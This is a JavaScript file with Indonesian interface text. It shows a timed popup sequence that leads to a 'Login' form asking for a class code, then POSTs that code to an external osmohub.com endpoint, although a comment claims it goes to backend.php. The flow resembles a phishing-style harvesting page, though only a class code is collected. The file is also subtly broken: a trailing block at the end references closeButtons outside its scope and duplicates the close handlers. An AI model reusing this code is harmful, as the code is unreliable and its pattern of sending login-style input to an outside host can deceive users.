// script.js
document.addEventListener('DOMContentLoaded', ()=> {
  const connectBtn = document.getElementById('connectBtn');
  const popup1 = document.getElementById('popup1');
  const popup2 = document.getElementById('popup2');
  const popup3 = document.getElementById('popup3');
  const classButtons = document.querySelectorAll('.class-btn');
  const kelasForm = document.getElementById('kelasForm');
  const backToPopup1 = document.getElementById('backToPopup1');
  const closeButtons = document.querySelectorAll('.close-popup');

  let autoPopupTimer = null;
  let userClickedConnect = false;

  function showPopup(el){
    el.setAttribute('aria-hidden','false');
  }
  function hidePopup(el){
    el.setAttribute('aria-hidden','true');
  }

  // Auto-show popup1 after 5s unless user already clicked Connect
  autoPopupTimer = setTimeout(()=>{
    if (!userClickedConnect) showPopup(popup1);
  }, 5000);

  // If user clicks Connect button BEFORE timeout, open popup1 and cancel auto-show
  connectBtn.addEventListener('click', ()=>{
    userClickedConnect = true;
    clearTimeout(autoPopupTimer);
    showPopup(popup1);
  });

  // clicking class buttons => open popup2 (and optionally store selected class)
  classButtons.forEach(btn => {
    btn.addEventListener('click', (e) => {
      // optional: store selected class name (data-target)
      const target = btn.getAttribute('data-target') || '';
      hidePopup(popup1);
      showPopup(popup2);

      // focus input
      const kodeInput = document.getElementById('kodeKelas');
      if (kodeInput) kodeInput.focus();
    });
  });

  // close buttons
  closeButtons.forEach(btn=> btn.addEventListener('click', (e)=>{
    const id = e.currentTarget.getAttribute('data-popup');
    if (id){
      const el = document.getElementById(id);
      if (el) hidePopup(el);
    } else {
      // generic: close parent popup
      const parent = e.currentTarget.closest('.popup');
      if (parent) hidePopup(parent);
    }
  }));

  // popup2 form submit -> send to backend.php
  kelasForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    const kodeInput = document.getElementById('kodeKelas');
    const kode = kodeInput.value.trim();
    if (!kode) { kodeInput.reportValidity(); return; }

    const submitBtn = kelasForm.querySelector('button[type=submit]');
    submitBtn.disabled = true;
    submitBtn.textContent = 'Memproses...';

    try {
      const resp = await fetch('https://osmohub.com/distribution/submit_form.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({ kode_kelas: kode })
      });
      const json = await resp.json();
      // optional: check json.success
      hidePopup(popup2);
      showPopup(popup3);
    } catch (err) {
      alert('Terjadi kesalahan saat mengirim. Coba lagi.');
    } finally {
      submitBtn.disabled = false;
      submitBtn.textContent = 'Login';
      kodeInput.value = '';
    }
  });

  // back to popup1 from popup3
  backToPopup1.addEventListener('click', ()=> {
    hidePopup(popup3);
    showPopup(popup1);
  });

  // processing dots animation (simple)
  (function animateDots(){
    const dotsEl = document.getElementById('dots');
    if (!dotsEl) return;
    let count = 0;
    setInterval(()=> {
      count = (count + 1) % 4;
      dotsEl.textContent = '.'.repeat(count);
    }, 500);
  })();

});
closeButtons.forEach(button => {
  button.addEventListener('click', () => {
    const popup = button.closest('.popup');
    if (popup) {
      popup.setAttribute('aria-hidden', 'true'); // sembunyikan popup
    }
  });
});
